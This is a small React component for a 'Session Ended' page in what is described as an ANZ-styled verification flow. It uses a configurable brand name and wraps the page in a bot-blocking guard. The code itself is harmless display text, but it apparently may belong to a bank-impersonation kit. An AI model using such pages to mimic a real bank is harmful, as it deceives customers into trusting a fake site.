'use client';

/**
 * ANZ Terminated/Session Ended Page
 * Centered single-column layout matching ANZ design
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertTriangle } from 'lucide-react';

export default function TerminatedPage() {
  return (
    <BotGuard>
      {/* Page Title */}
      <h1 className="page-title">Session Ended</h1>

      {/* Content Container */}
      <div className="login-card">
        <div className="status-container">
          {/* Warning Icon - Centered */}
          <div className="status-icon-wrapper warning">
            <AlertTriangle strokeWidth={1.5} />
          </div>

          <p className="status-message-primary">
            Your verification session has ended.
          </p>

          <p className="status-message-secondary">
            This may be due to inactivity or the session was completed.
          </p>

          <p className="status-message-secondary" style={{ marginTop: '24px' }}>
            If you believe this was an error, please contact our support team for assistance.
          </p>

          <p className="status-footer">
            Need help? Contact {currentBrand.companyName} support
          </p>
        </div>
      </div>
    </BotGuard>
  );
}
